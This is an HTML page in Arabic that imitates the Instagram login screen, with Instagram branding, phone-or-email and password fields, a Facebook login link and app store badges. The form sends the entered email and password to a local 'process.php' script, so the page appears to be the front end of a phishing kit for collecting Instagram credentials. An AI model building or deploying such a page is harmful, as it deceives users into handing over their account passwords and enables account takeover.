<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #000;
            color: #fff;
            text-align: center;
            margin: 0;
        }
        .container {
            margin: 100px auto;
            width: 300px;
            background: #111;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
        }
        .container h1 {
            font-family: 'Arial', sans-serif;
            margin-bottom: 20px;
            font-size: 32px;
        }
        input {
            width: 82%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #222;
            color: #fff;
        }
        button {
            background-color: #0095f6;
            color: #fff;
            padding: 10px;
            width: 90%;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0073e6;
        }
        a {
            color: #0095f6;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Instagram</h1>
        <form action="process.php" method="POST">
            <input type="text" name="email" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
            <input type="password" name="password" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
        <p>أو</p>
        <a href="#">تسجيل الدخول بحساب فيسبوك</a>
        <p><a href="#">هل نسيت كلمة السر؟</a></p>
        <div class="footer">
            <p>أليس لديك حساب؟ <a href="#">تسجيل</a></p>
            <p>احصل على التطبيق:</p>
            <div>
                <img src="go.png" alt="Google Play" style="width: 100px;">
                <img src="app.png" alt="App Store" style="width: 100px;">
            </div>
    </div>
</body>
</html>
